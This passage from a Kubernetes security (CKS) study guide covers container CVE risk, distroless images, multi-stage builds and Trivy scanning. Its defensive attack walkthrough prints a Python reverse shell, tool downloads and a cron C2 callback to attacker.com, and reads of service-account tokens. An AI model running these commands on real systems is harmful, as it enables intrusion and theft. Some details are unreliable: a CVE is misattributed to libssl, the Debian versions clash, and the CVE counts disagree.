23.1 Why Container Images Are a Security Risk — The Full Picture

When you write FROM python:3.12 in your Dockerfile, you are not just getting Python. You are pulling approximately 1,000+ Debian packages into your application's runtime environment — curl, wget, bash, openssl, libc, systemd libraries, perl, and hundreds more. Many of these packages have known, publicly documented vulnerabilities with exploit code available online. The fundamental problem: images are static snapshots that rot over time. The day you build them, they may have zero known CVEs. Six months later, 23 new CVEs are discovered in packages you didn't even know were in the image — and your production pods are still running that old image.

The CVE Lifecycle — How a Vulnerability Ends Up in Your Container

1Discovery

A security researcher or attacker finds a bug in curl 7.74.0 — a buffer overflow triggered by a malicious SOCKS5 proxy response.

2CVE Assignment

MITRE assigns CVE-2023-38545. The vulnerability is now publicly tracked with a unique identifier. NVD (National Vulnerability Database) picks it up.

3CVSS Scoring

NVD analysts assign a CVSS score: 9.8 (CRITICAL). Attack vector: Network, complexity: Low, privileges: None, user interaction: None. This is as bad as it gets.

4Publication

The CVE is published in NVD, MITRE, and security feeds. Trivy's vulnerability database ingests it within hours. Exploit code often appears on GitHub within days.

5Distribution Lag

Debian maintainers backport the fix to curl 7.74.0-1.3+deb11u7. But your image was built 6 months ago with curl 7.74.0-1.3+deb11u2 — the vulnerable version. The fix exists, but YOUR image didn't get it because images don't auto-update.

6Exploitation Window

Your production pods running anihpj:v1 are now vulnerable to CVE-2023-38545. Any network request your app makes could be intercepted. Trivy would catch this — but only if you scan.

⚠️ The Core Insight: Images Are Immutable — Vulnerabilities Are Not

Unlike a VM where you run apt upgrade and fix vulnerabilities, container images are immutable by design. The only way to fix a CVE in a running container is to rebuild the image with updated packages and redeploy. This means every image in your registry is a ticking time bomb — secure today, vulnerable tomorrow, without a single line of your code changing. This is why continuous scanning (not one-time scanning) is essential.

Image Layer Anatomy — Why Risk Accumulates in Layers

Every Dockerfile instruction creates a new filesystem layer. Each layer adds packages, libraries, and configuration files — and each layer can introduce vulnerabilities independently:

Docker Image Layer Stack — anihpj:v1 (Debian-based, 6 layers)
  LAYER 6: COPY . /app                                    [your Django code — ~50MB]
  ──────────────────────────────────────────────────────────────────────────
  LAYER 5: RUN pip install -r requirements.txt             [Python packages — ~200MB]
  │  Introduces: Django 4.2, gunicorn, psycopg2, celery, redis, ... 
  │  Risk: Python package CVEs (e.g., CVE-2024-xxx in Django itself)
  ──────────────────────────────────────────────────────────────────────────
  LAYER 4: RUN apt-get install gcc postgresql-client ...   [build tools — ~300MB]
  │  Introduces: gcc-10, libpq-dev, build-essential, make, git
  │  Risk: Compiler CVEs (CVE-2023-4039: gcc stack protector bypass)
  ──────────────────────────────────────────────────────────────────────────
  LAYER 3: RUN apt-get update && apt-get install -y curl   [utilities — ~50MB]
  │  Introduces: curl 7.74.0, libcurl4, ca-certificates
  │  Risk: CVE-2023-38545 — CRITICAL RCE via SOCKS5 (CVSS 9.8)
  ──────────────────────────────────────────────────────────────────────────
  LAYER 2: RUN apt-get update && apt-get upgrade           [system updates — ~100MB]
  │  Introduces: openssl 1.1.1n, libc6 2.31, libssl1.1
  │  Risk: CVE-2023-44487 — HTTP/2 Rapid Reset DoS (CVSS 7.5)
  │  Risk: CVE-2023-4911 — glibc Looney Tunables LPE (CVSS 7.8)
  ──────────────────────────────────────────────────────────────────────────
  LAYER 1: FROM python:3.12                                [base OS — ~350MB]
  │  Introduces: Debian 12 (bookworm), systemd libs, perl, bash, apt, dpkg
  │  Risk: Hundreds of OS-level packages, many with latent CVEs
  ──────────────────────────────────────────────────────────────────────────

  🔴 TOTAL: ~1,050MB image. ~1,200 packages. 23 known CVEs after 6 months.
  🟢 GOAL:  ~20MB distroless image. ~5 packages. 0-1 CVEs.

CVSS Scoring Explained — What Those Numbers Actually Mean

CVSS RangeSeverityWhat It MeansAction for CKS
9.0–10.0CRITICALNetwork-exploitable, no auth needed, no user interaction. Wormable. Example: Log4Shell (CVE-2021-44228, CVSS 10.0).🚨 BLOCK DEPLOYMENT. Fix immediately. This is the "drop everything" severity.
7.0–8.9HIGHCan lead to RCE, privilege escalation, or data breach. May require some conditions. Example: Looney Tunables (CVE-2023-4911, CVSS 7.8).⚠️ Fix within SLA (e.g., 30 days). Document the risk acceptance if deferred.
4.0–6.9MEDIUMDifficult to exploit or limited impact. Example: Information disclosure via timing attack. Often requires local access.📋 Track and fix in next release cycle. Don't block deployment.
0.1–3.9LOWMinimal impact, theoretical exploit, or requires unrealistic conditions.✅ Acknowledge, fix when convenient. Low priority.

🔴 ATTACK SCENARIO: Exploiting CVE-2023-38545 (curl SOCKS5 RCE) in anihpj:v1

ATTACK SCENARIO How an Attacker Exploits a Known CVE in Your Container
1
Reconnaissance

Attacker scans your cluster's external endpoints. They discover your Django app at jobs.anihpj.com. The HTTP response headers reveal: Server: gunicorn/21.2.0. They fingerprint the stack. They also find your public Docker image anihpj/anihpj-django:v1 on Docker Hub. They pull it and scan it with Trivy themselves — discovering CVE-2023-38545 (curl heap buffer overflow, CVSS 9.8).

2
Weaponization

The attacker crafts a malicious SOCKS5 proxy server. When curl (inside your container) connects to this proxy, the proxy sends a specially crafted response that overflows curl's heap buffer — giving the attacker arbitrary code execution as the user running curl (UID 1000 in your container). The attacker hosts the malicious proxy at evil-proxy.attacker.com:1080.

3
Delivery — How curl Gets Triggered

Your Django app has a feature: "Import jobs from external URL." A user pastes a URL, the backend does requests.get(user_url) → which internally might use curl or libcurl if compiled with it. Or: your Celery task downloads a file from a user-supplied S3 URL using curl as a subprocess. The attacker submits a URL pointing to their malicious proxy: socks5h://evil-proxy.attacker.com:1080. Your container's curl connects to it.

4
Exploitation — Code Execution Inside the Container

The malicious proxy sends the exploit payload. curl's heap buffer overflows. The attacker achieves Remote Code Execution (RCE) inside the anihpj container — as UID 1000, inside the container's namespace. They now have a shell-equivalent inside your container. They can read /app/anihpj/settings.py (with your Django SECRET_KEY and DATABASE_URL). They can access the PostgreSQL database at postgres.anihpj.svc.cluster.local:5432 because the container has network access to the DB service.

5
Lateral Movement

From inside the container, the attacker reads the mounted ServiceAccount token at /var/run/secrets/kubernetes.io/serviceaccount/token. They use this token to list pods: curl -k https://kubernetes.default.svc/api/v1/namespaces/anihpj/pods. If the ServiceAccount has excessive RBAC permissions (common mistake!), they can now deploy their own malicious pods, exfiltrate secrets, or access other namespaces.

🛡️
How to Stop This Attack — Defense in Depth

(1) Scan with Trivy BEFORE deploying — would have caught CVE-2023-38545 immediately. (2) Use distroless base image — no curl binary to exploit. (3) NetworkPolicy — block egress from app pods to internet (only allow DB and API egress). (4) Seccomp — block socket() syscalls to prevent outbound connections. (5) RBAC — least-privilege ServiceAccount with no pod listing permissions. (6) readOnlyRootFilesystem — prevents writing exploit tools to disk. Each layer alone is not enough. All six together make exploitation nearly impossible.

Decision Tree: Should I Worry About This CVE?

CVE Risk Assessment for Container Images
  NEW CVE FOUND in your image
  │
  ├─ Is the vulnerable package INSTALLED in the image?
  │  ├─ NO  → ✅ Low risk. But check if it's a transitive dependency.
  │  └─ YES → ▼
  │     ├─ Is the vulnerable package EXECUTED at runtime?
  │     │  ├─ NO (e.g., curl exists but app never calls it)
  │     │  │  └─ ⚠️ MEDIUM risk. Attacker could still execute it if they get RCE via another vector.
  │     │  └─ YES → ▼
  │     │     ├─ Is the vulnerability NETWORK-EXPLOITABLE? (AV:N in CVSS vector)
  │     │     │  ├─ YES → ▼
  │     │     │  │  ├─ CVSS ≥ 9.0 → 🔴 CRITICAL — BLOCK deployment. Fix NOW.
  │     │     │  │  ├─ CVSS 7.0-8.9 → 🟠 HIGH — Fix within SLA. May block deployment.
  │     │     │  │  └─ CVSS < 7.0 → 🟡 MEDIUM — Fix in next release.
  │     │     │  └─ NO (Local access required) → ▼
  │     │     │     ├─ Is the container running as root? → 🟠 HIGH (LPE risk)
  │     │     │     └─ Container runs as non-root → 🟡 MEDIUM (Harder to exploit)
  │     │     └─ Is there a KNOWN PUBLIC EXPLOIT? (ExploitDB, Metasploit)
  │     │        ├─ YES → 🔴 ESCALATE — treat as CRITICAL regardless of CVSS
  │     │        └─ NO  → Follow CVSS-based assessment above
  │     └─ Is the package in a LAYER that could be removed? (build-only layer)
  │        └─ YES → 🟢 Remove it entirely. Multi-stage build can eliminate build tools from final image.
CVE Severity Distribution — Average Docker Hub Python Image (6 months old)
CRITICAL: 2
HIGH: 6
MEDIUM: 10
LOW: 5
NONE: 2

Total: 25 CVEs | CRITICAL: 8% | Actionable (CRITICAL+HIGH): 32% | Fix cost: Rebuild + redeploy (~30 min)

23.2 Minimizing Image Attack Surface — The Distroless Revolution

Every package you remove is an attack vector eliminated forever. There is no patch, no CVE, and no exploit for a package that simply does not exist in your image. The goal is a minimal image that contains ONLY your application and its runtime dependencies — no shell, no package manager, no curl/wget/git/nc/perl. This is the philosophy behind Google's distroless images: "If you don't need it, it shouldn't be in the image."

Distroless Architecture — Why "No Shell" Is the Ultimate Security Win

Distroless Image Anatomy — What's Present vs What's Absent
  DISTROLESS IMAGE (gcr.io/distroless/python3-debian12)
  ════════════════════════════════════════════════════
  ✅ PRESENT (essentials only):
     • /usr/bin/python3.11          — Python interpreter
     • /usr/lib/python3.11/         — Python standard library
     • /lib/x86_64-linux-gnu/libc.so.6  — glibc (Python needs it)
     • /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2  — dynamic linker
     • /etc/passwd, /etc/group      — user/group database (for USER directive)
     • /etc/ssl/certs/              — CA certificates (for TLS)
     • /tmp/                        — writable tmp (scratch space)
     • Your application files       — copied from builder stage

  ❌ ABSENT (attack vectors eliminated):
     • /bin/bash, /bin/sh           — NO SHELL. kubectl exec → fails.
     • /usr/bin/curl, /usr/bin/wget — NO download tools. Cannot pull malware.
     • /usr/bin/apt, /usr/bin/dpkg  — NO PACKAGE MANAGER. Cannot install tools.
     • /usr/bin/gcc, /usr/bin/make  — NO COMPILER. Cannot build exploits.
     • /usr/bin/git, /usr/bin/nc    — NO dev tools. Cannot clone repos.
     • /usr/bin/perl, /usr/bin/python2 — NO legacy runtimes with known CVEs.
     • /usr/bin/ssh, /usr/bin/scp   — NO remote access tools.
     • /usr/bin/cron, /usr/sbin/cron— NO job scheduler. Cannot persist tasks.
     • /bin/chmod, /bin/chown       — NO permission modifiers (in some distroless variants)
     • systemd, init scripts        — NO init system. PID 1 is your app.

  📊 RESULT:
     • Image size: ~20MB vs ~1,050MB full Debian image
     • Package count: ~5 vs ~1,200 packages
     • Attack surface: REDUCED BY ~99.6%
     • CVEs: 0-1 vs 23 in the full image
     • kubectl exec anihpj -- /bin/bash → "exec: /bin/bash: no such file or directory"
     • This is a FEATURE, not a bug. Attackers cannot get a shell either.
💡 The Distroless Mindset Shift

Many developers resist distroless because they can't kubectl exec into the container to debug. This is the wrong instinct. In production, if you need a shell, your observability is broken. Fix your logging, metrics, and tracing instead. Use kubectl logs, Prometheus metrics, and distributed traces. If you absolutely need debugging access, use an ephemeral debug container: kubectl debug -it anihpj-pod --image=busybox --target=anihpj. This attaches a separate debugging container with a shell WITHOUT modifying the production image.

Base Image Comparison — Full Analysis for anihpj Django App

Base ImageSizeShellPkg MgrTypical CVE CountStartup TimeRecommendation
python:3.12~1,050 MB✅ bash, sh, dash✅ apt, dpkg100+Slow (init overhead)Development only. Never in production.
python:3.12-slim~130 MB✅ bash✅ apt20-40ModerateAcceptable if you need apt-based dependencies. Scan rigorously.
python:3.12-alpine~22 MB✅ sh (busybox)✅ apk0-5FastGood security. musl libc may cause compatibility issues with some Python wheels.
gcr.io/distroless/python3~20 MB❌ NONE❌ NONE0-1Very fast🏆 MAXIMUM SECURITY. Best choice for production. Requires multi-stage build.
chainguard/python~15 MB❌ NONE❌ NONE0 (zero-CVE policy)Very fast🏆 Enterprise-grade distroless. Wolfi OS. Signed by Chainguard.
SCRATCH0 MB (empty)❌ NONE❌ NONE0InstantOnly for statically compiled Go/Rust binaries. No libc.

Decision Tree: Which Base Image Should You Choose?

Base Image Selection Strategy for Production Kubernetes
  START: I need a Python base image for production
  │
  ├─ Does my app use C extensions that need specific glibc?
  │  ├─ YES → Use python:3.12-slim OR distroless (Debian-based, has glibc)
  │  └─ NO → ▼
  │     └─ Is my app pure Python (no C extensions)?
  │        ├─ YES → python:3.12-alpine OR distroless
  │        └─ NO → Continue below
  │
  ├─ Do I need ANY of these: shell, apt, curl, debugging tools?
  │  ├─ YES → python:3.12-slim (accept the security trade-off)
  │  │  ⚠️ WARNING: This is a SECURITY COMPROMISE. Document it.
  │  └─ NO → ▼
  │     └─ Can I use multi-stage builds?
  │        ├─ YES → distroless (BUILD in python:3.12-slim, RUN in distroless)
  │        └─ NO → python:3.12-alpine (single-stage compromise)
  │
  ├─ Am I in a HIGHLY REGULATED industry? (finance, healthcare, government)
  │  └─ YES → chainguard/python (zero-CVE policy, signed, Wolfi OS)
  │
  └─ Am I running a STATICALLY COMPILED binary? (Go, Rust)
     └─ YES → SCRATCH (0 bytes, 0 CVEs, 0 attack surface)

Multi-Stage Build Internals — How COPY --from Actually Works

A multi-stage build is not just a Dockerfile pattern — it's a fundamental security boundary. The build stage has compilers, package managers, headers, and dev tools. The runtime stage has NONE of these. The COPY --from=builder instruction selectively copies only the artifacts (compiled binaries, installed packages, application code) into the final image. Everything else — gcc, make, git, pip cache, header files, dev libraries — stays in the builder stage and is discarded when the build completes. The final image never contains build tools.

Dockerfile — Full multi-stage build for anihpj Django with detailed annotations 
# ═══════════════════════════════════════════════════════════════════
# STAGE 1: BUILD — Has compilers, pip, git, headers
# This stage is THROWN AWAY after the build completes.
# It exists ONLY to compile/install and then hand off artifacts.
# ═══════════════════════════════════════════════════════════════════
FROM python:3.12-slim AS builder          # 130MB, has pip + apt
WORKDIR /app

# Install BUILD-TIME dependencies (compilers, headers, dev libraries)
# These are NEEDED to compile Python C extensions (psycopg2, Pillow, etc.)
# They will NOT be in the final image — ONLY in this throwaway stage.
RUN apt-get update && apt-get install -y --no-install-recommends \
    gcc \
    g++ \
    make \
    libpq-dev \          # PostgreSQL headers for psycopg2
    libjpeg-dev \        # JPEG headers for Pillow
    && rm -rf /var/lib/apt/lists/*

# Copy ONLY requirements first (layer caching optimization)
COPY requirements.txt .
# Install Python packages to /root/.local (NOT system-wide)
# --user flag installs to ~/.local, making COPY --from trivial
RUN pip install --no-cache-dir --user -r requirements.txt

# ═══════════════════════════════════════════════════════════════════
# STAGE 2: RUNTIME — Minimal. No shell. No compiler. No pip.
# Only the Python interpreter + application + dependencies.
# ═══════════════════════════════════════════════════════════════════
FROM gcr.io/distroless/python3-debian12   # 20MB, no shell, no apt
WORKDIR /app

# Copy installed Python packages from builder stage
# --from=builder references the throwaway build stage
# /root/.local is where pip --user installed everything
COPY --from=builder /root/.local /root/.local

# Copy application source code
COPY . .

# Run as non-root user
# distroless images include /etc/passwd with a 'nonroot' user (UID 65532)
USER 65532

# exec form is REQUIRED with distroless (no shell to interpret CMD strings)
# This runs gunicorn DIRECTLY, not via /bin/sh -c "..."
CMD ["gunicorn", "anihpj.wsgi:application", \
     "--bind", "0.0.0.0:8000", \
     "--workers", "4", \
     "--access-logfile", "-", \
     "--error-logfile", "-"]

# 🔑 KEY SECURITY PROPERTIES OF THIS BUILD:
#   1. gcc, make, git, apt — NEVER in the final image
#   2. pip, setuptools, wheel — NEVER in the final image
#   3. bash, sh, dash — NONE. kubectl exec fails. Attackers can't get a shell.
#   4. libpq-dev headers — NEVER in the final image (only compiled psycopg2 remains)
#   5. Image size: ~60MB (code + deps + distroless base)
#   6. CVE count: 0-1 (vs 23 in the full python:3.12 image)

🔴 ATTACK SCENARIO: Full Image vs Distroless — The Shell Makes All the Difference

WITH SHELL — python:3.12 (FULL IMAGE)
# Attacker gets RCE via CVE-2023-38545 (curl overflow)
# They now have arbitrary code execution as UID 1000.

# Step 1: Spawn a reverse shell
$ python3 -c 'import socket,subprocess,os;\
  s=socket.socket();s.connect(("attacker.com",4444));\
  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);\
  os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'

# Attacker now has an interactive bash shell in YOUR container
attacker@anihpj-pod:/app$ whoami
1000
attacker@anihpj-pod:/app$ ls /
bin  boot  dev  etc  home  lib  media  mnt  opt
proc  root  run  sbin  srv  sys  tmp  usr  var

# Step 2: Download tools (curl is available!)
attacker@anihpj-pod:/tmp$ curl -O http://attacker.com/nmap-static
attacker@anihpj-pod:/tmp$ chmod +x nmap-static
attacker@anihpj-pod:/tmp$ ./nmap-static 10.0.0.0/24
# Now scanning your internal cluster network!

# Step 3: Install persistence
attacker@anihpj-pod:/tmp$ apt-get update  # apt is available!
attacker@anihpj-pod:/tmp$ apt-get install -y cron
attacker@anihpj-pod:/tmp$ echo "*/5 * * * * curl http://attacker.com/c2" | crontab -
# Now the attacker has a C2 callback every 5 minutes!

# Step 4: Exfiltrate secrets
attacker@anihpj-pod:/app$ cat settings.py  # SECRET_KEY, DATABASE_URL
attacker@anihpj-pod:/app$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
# ServiceAccount token — can now talk to the API server!

# 💀 RESULT: Full cluster compromise likely.
WITHOUT SHELL — distroless (NO SHELL)
# Attacker gets SAME RCE via CVE-2023-38545 (curl overflow).
# They have arbitrary code execution as UID 65532.

# Step 1: Try to spawn a reverse shell
$ python3 -c 'import subprocess;\
  subprocess.call(["/bin/bash"])'
# ERROR: [Errno 2] No such file or directory: '/bin/bash'

$ python3 -c 'import subprocess;\
  subprocess.call(["/bin/sh"])'
# ERROR: [Errno 2] No such file or directory: '/bin/sh'

$ python3 -c 'import subprocess;\
  subprocess.call(["/bin/dash"])'
# ERROR: [Errno 2] No such file or directory: '/bin/dash'

# Step 2: Try to download tools
$ python3 -c 'import subprocess;\
  subprocess.call(["curl", "http://attacker.com/nmap"])'
# ERROR: [Errno 2] No such file or directory: 'curl'

$ python3 -c 'import subprocess;\
  subprocess.call(["wget", "http://attacker.com/nmap"])'
# ERROR: [Errno 2] No such file or directory: 'wget'

# Step 3: Try to install packages
$ python3 -c 'import subprocess;\
  subprocess.call(["apt", "install", "cron"])'
# ERROR: [Errno 2] No such file or directory: 'apt'

# Step 4: The attacker CAN still do some damage:
# - Read files via Python: open('/app/settings.py').read()
# - Make HTTP requests via Python: urllib.request.urlopen(...)
# - Use the ServiceAccount token if mounted

# BUT the attacker CANNOT:
# ❌ Get an interactive shell
# ❌ Download external tools
# ❌ Install packages
# ❌ Create cron jobs
# ❌ Run nmap or other network tools
# ❌ Use chmod/chown to modify permissions

# 🛡️ RESULT: The attacker is trapped in a Python-only sandbox.
#    They can do what Python can do — which is a LOT less than
#    what a full Linux shell can do. Incident response is easier.

Bottom line: In the full image scenario, the attacker gets a full Linux environment — bash, curl, apt, cron. In distroless, the attacker is confined to what Python's standard library can do. The difference in post-exploitation capability is massive.

How to Migrate from Full Images to Distroless — Step by Step

1Identify shell/exec usage

Find every place in your CI/CD, Helm charts, and ops runbooks that does kubectl exec ... -- /bin/bash or kubectl exec ... -- python manage.py shell. These will break with distroless.

2Replace exec-based tasks

Management commands → run as Kubernetes Jobs or CronJobs. Debugging → use kubectl debug ephemeral containers. Health checks → use HTTP/TCP probes, not exec probes.

3Convert to multi-stage build

Add a builder stage with python:3.12-slim. Move all apt-get install, pip install, and compilation to the builder stage. Use COPY --from=builder to bring artifacts into distroless.

4Test with Trivy

Build the new image. Run trivy image anihpj:v2-distroless. Compare CVE count with v1. Expect: 23→1 or 23→0. If you still see CVEs, check which packages remain.

5Deploy to staging

Deploy the distroless image to a staging namespace. Verify: app starts, responds to requests, logs appear (stdout/stderr still work!), health checks pass. Let it run for 24 hours.

6Promote to production

Roll out with canary deployment: 10% → 50% → 100%. Monitor error rates, latency, and crash loops. If everything is stable, you now have a 99.6% smaller attack surface.

23.3 Trivy — Image Vulnerability Scanner Deep Dive

Trivy is the de facto standard open-source vulnerability scanner for containers, developed by Aqua Security. It's fast (scans in seconds), comprehensive (detects CVEs in OS packages AND language-specific dependencies), and free. The CKS exam expects you to scan an image and interpret the output. But to truly understand Trivy, you need to understand how it works under the hood — the vulnerability database, the matching algorithm, and the CI/CD integration patterns.

How Trivy Works Internally — The Vulnerability Matching Engine

Trivy Architecture — From Image to Vulnerability Report
  ┌──────────────────────────────────────────────────────────────────────┐
  │                        TRIVY SCAN PIPELINE                            │
  │                                                                       │
  │  STEP 1: IMAGE ACQUISITION                                            │
  │  ┌──────────────────────────────────────────────────────────────┐    │
  │  │  trivy image anihpj:v1                                       │    │
  │  │  • Pulls image layers from Docker daemon or remote registry  │    │
  │  │  • Extracts filesystem from each layer                       │    │
  │  │  • Identifies OS type: Debian 11 (from /etc/os-release)     │    │
  │  └──────────────────────┬───────────────────────────────────────┘    │
  │                         │                                             │
  │                         ▼                                             │
  │  STEP 2: PACKAGE INVENTORY                                           │
  │  ┌──────────────────────────────────────────────────────────────┐    │
  │  │  Trivy scans the filesystem and builds a package list:        │    │
  │  │  • OS packages: Parses dpkg/apt database in /var/lib/dpkg/   │    │
  │  │    → curl 7.74.0-1.3+deb11u2                                 │    │
  │  │    → libssl1.1 1.1.1n-0+deb11u4                              │    │
  │  │    → libc6 2.31-13+deb11u5                                   │    │
  │  │  • Python packages: Parses pip metadata in site-packages/     │    │
  │  │    → Django 4.2.1                                             │    │
  │  │    → requests 2.31.0                                          │    │
  │  │  • Node.js: Parses package.json / node_modules                │    │
  │  │  • Java: Parses JAR/Maven metadata                            │    │
  │  │  • Go: Parses binary build info                               │    │
  │  └──────────────────────┬───────────────────────────────────────┘    │
  │                         │                                             │
  │                         ▼                                             │
  │  STEP 3: VULNERABILITY DATABASE LOOKUP                               │
  │  ┌──────────────────────────────────────────────────────────────┐    │
  │  │  Trivy maintains a local vulnerability database (updated daily):│   │
  │  │                                                               │    │
  │  │  DATABASE CONTENTS (trivy db):                                │    │
  │  │  ┌─────────────────────────────────────────────────────────┐ │    │
  │  │  │  curl 7.74.0-1.3+deb11u2 → CVE-2023-38545 (CRITICAL)    │ │    │
  │  │  │  libssl1.1 1.1.1n-0+deb11u4 → CVE-2023-44487 (HIGH)     │ │    │
  │  │  │  libc6 2.31-13+deb11u5 → CVE-2023-4911 (HIGH)           │ │    │
  │  │  │  Django 4.2.1 → CVE-2024-xxx (MEDIUM)                   │ │    │
  │  │  │  requests 2.31.0 → CVE-2024-yyy (MEDIUM)                │ │    │
  │  │  └─────────────────────────────────────────────────────────┘ │    │
  │  │                                                               │    │
  │  │  SOURCES: NVD, Debian Security Tracker, Red Hat OVAL,        │    │
  │  │  Alpine SecDB, GitHub Advisory Database, OSV, GHSA           │    │
  │  │                                                               │    │
  │  │  MATCHING LOGIC: For each package in the image:              │    │
  │  │  package_name + package_version → DB lookup → CVE list       │    │
  │  │  Trivy uses FUZZY matching: considers distro-specific        │    │
  │  │  backports (Debian may backport a fix to an older version)   │    │
  │  └──────────────────────┬───────────────────────────────────────┘    │
  │                         │                                             │
  │                         ▼                                             │
  │  STEP 4: REPORT GENERATION                                           │
  │  ┌──────────────────────────────────────────────────────────────┐    │
  │  │  Collates all matched CVEs into a structured report:          │    │
  │  │  • CVE ID + severity + CVSS score + affected package         │    │
  │  │  • Fixed version (if available)                               │    │
  │  │  • References (NVD link, advisory link)                       │    │
  │  │  • Output formats: table, JSON, SARIF, HTML, template        │    │
  │  └──────────────────────────────────────────────────────────────┘    │
  └──────────────────────────────────────────────────────────────────────┘
📝 Critical Detail: The Database MUST Be Updated Before Every Scan

Trivy's vulnerability database is a local cache. If you scanned yesterday and a new CVE was published today, your scan will miss it. Always update before scanning in CI/CD: trivy image --refresh anihpj:v1 or trivy image --db-repository ghcr.io/aquasecurity/trivy-db anihpj:v1. In air-gapped environments, you can download the database once and distribute it: trivy image --skip-db-update --db-repository /path/to/local/db anihpj:v1. For the CKS exam, you'll likely have internet access — but know the air-gapped pattern.

Trivy Command Reference — Every Command You Need for CKS

Bash — Comprehensive Trivy commands for CKS exam scenarios 
# ═══════════════════════════════════════════════════════════════
# BASIC SCANNING
# ═══════════════════════════════════════════════════════════════

# Scan a local Docker image
trivy image anihpj:v1

# Scan an image in a remote registry (Docker Hub, ECR, GCR, ACR)
trivy image registry.anihpj.com/anihpj-django:v2.0.0

# Scan with database refresh (always do this in CI/CD!)
trivy image --refresh anihpj:v1

# ═══════════════════════════════════════════════════════════════
# SEVERITY FILTERING — FOCUS ON WHAT MATTERS
# ═══════════════════════════════════════════════════════════════

# Show only CRITICAL and HIGH vulnerabilities
trivy image --severity CRITICAL,HIGH anihpj:v1

# Show only CRITICAL (ignore everything else for quick triage)
trivy image --severity CRITICAL anihpj:v1

# ═══════════════════════════════════════════════════════════════
# CI/CD INTEGRATION — FAIL BUILDS ON VULNERABILITIES
# ═══════════════════════════════════════════════════════════════

# Exit with code 1 if CRITICAL vulnerabilities found
# This BLOCKS the CI/CD pipeline — the image NEVER gets deployed
trivy image --severity CRITICAL --exit-code 1 anihpj:v1

# Exit with code 1 if any vulnerability CRITICAL or HIGH
trivy image --severity CRITICAL,HIGH --exit-code 1 anihpj:v1

# Set a timeout (prevents hung scans in CI)
trivy image --timeout 5m anihpj:v1

# ═══════════════════════════════════════════════════════════════
# OUTPUT FORMATS — FOR PIPELINES, DASHBOARDS, AND COMPLIANCE
# ═══════════════════════════════════════════════════════════════

# Table format (default, human-readable)
trivy image --format table anihpj:v1

# JSON output (for pipeline processing, SIEM integration)
trivy image --format json --output anihpj-scan.json anihpj:v1

# SARIF format (for GitHub Code Scanning integration)
trivy image --format sarif --output anihpj-scan.sarif anihpj:v1

# HTML report (for compliance auditors, attach to release notes)
trivy image --format template --template "@contrib/html.tpl" \
  -o anihpj-report.html anihpj:v1

# ═══════════════════════════════════════════════════════════════
# ADVANCED: SCAN FOR MISCONFIGURATIONS AND SECRETS TOO
# ═══════════════════════════════════════════════════════════════

# Scan for misconfigurations (Dockerfile best practices, CIS benchmarks)
trivy image --scanners vuln,misconfig anihpj:v1

# Scan for embedded secrets (API keys, tokens accidentally baked in)
trivy image --scanners vuln,secret anihpj:v1

# Scan everything: vulnerabilities + misconfigurations + secrets
trivy image --scanners vuln,misconfig,secret anihpj:v1

# ═══════════════════════════════════════════════════════════════
# IGNORE SPECIFIC CVEs (WITH JUSTIFICATION)
# ═══════════════════════════════════════════════════════════════

# Create .trivyignore file with CVE IDs to suppress
cat > .trivyignore << 'EOF'
# Suppressed: CVE-2023-44487 — HTTP/2 DoS, not exploitable in our
# internal-only deployment behind ALB that terminates HTTP/2
CVE-2023-44487
EOF

trivy image --ignorefile .trivyignore anihpj:v1

CI/CD Integration — GitHub Actions Pipeline with Trivy Gate

YAML — GitHub Actions workflow: Build → Scan → Deploy (scan gate blocks deployment) 
name: anihpj CI/CD with Trivy Scan Gate

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build-and-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # ── Build the Docker image ──
      - name: Build anihpj image
        run: docker build -t anihpj:${{ github.sha }} .

      # ── TRIVY SCAN GATE ──
      # This is the SECURITY GATE: if CRITICAL CVEs are found,
      # the pipeline FAILS and the image NEVER gets pushed.
      - name: Trivy vulnerability scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: anihpj:${{ github.sha }}
          format: table
          exit-code: 1           # FAIL on CRITICAL/HIGH
          severity: CRITICAL,HIGH
          timeout: 10m

      # ── Only runs if Trivy passes ──
      - name: Tag and push to registry
        if: success()           # Only push if Trivy passed
        run: |
          docker tag anihpj:${{ github.sha }} registry.anihpj.com/anihpj:${{ github.sha }}
          docker push registry.anihpj.com/anihpj:${{ github.sha }}

      # ── Upload scan results as artifact (for audit trail) ──
      - name: Generate SARIF report
        if: always()            # Generate report even if scan fails
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: anihpj:${{ github.sha }}
          format: sarif
          output: trivy-results.sarif
          severity: CRITICAL,HIGH

      - name: Upload scan results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: trivy-scan-results
          path: trivy-results.sarif

Interpreting Trivy Output — What Each Field Means

Anatomy of a Trivy Finding — Every Field Explained
  ┌─────────────────────────────────────────────────────────────────────────┐
  │  anihpj:v1 (debian 11.6)          ← Image name + detected OS            │
  │  ════════════════════════                                              │
  │  Total: 23 (CRITICAL: 2, HIGH: 8, MEDIUM: 13)  ← Summary stats         │
  │                                                                         │
  │  ┌──────────────┬──────────┬──────────┬────────────────────────────────┐│
  │  │   LIBRARY    │VULNERAB- │ SEVERITY │     INSTALLED → FIXED          ││
  │  │              │  ILITY   │          │                                ││
  │  ├──────────────┼──────────┼──────────┼────────────────────────────────┤│
  │  │ curl         │CVE-2023- │ CRITICAL │ 7.74.0-1.3+deb11u2            ││
  │  │              │ 38545    │  9.8     │ → 7.74.0-1.3+deb11u7     ←──  ││
  │  │              │          │          │   ^^^^ INSTALLED   ^^^^ FIXED  ││
  │  ├──────────────┼──────────┼──────────┼────────────────────────────────┤│
  │  │ libssl1.1    │CVE-2023- │ HIGH     │ 1.1.1n-0+deb11u4              ││
  │  │              │ 44487    │  7.5     │ → 1.1.1n-0+deb11u5             ││
  │  ├──────────────┼──────────┼──────────┼────────────────────────────────┤│
  │  │ libc-bin      │ CVE-2023- │ HIGH     │ 2.31-13+deb11u5              ││
  │  │ (glibc)      │ 4911     │  7.8     │ → 2.31-13+deb11u7             ││
  │  └──────────────┴──────────┴──────────┴────────────────────────────────┘│
  │                                                                         │
  │  🔑 HOW TO READ THE INSTALLED → FIXED COLUMN:                           │
  │  ┌─────────────────────────────────────────────────────────────────┐   │
  │  │  If INSTALLED version < FIXED version → VULNERABLE               │   │
  │  │  If INSTALLED version ≥ FIXED version → FIXED (not reported)     │   │
  │  │  If FIXED is empty → NO FIX AVAILABLE YET (worst case)           │   │
  │  │                                                                   │   │
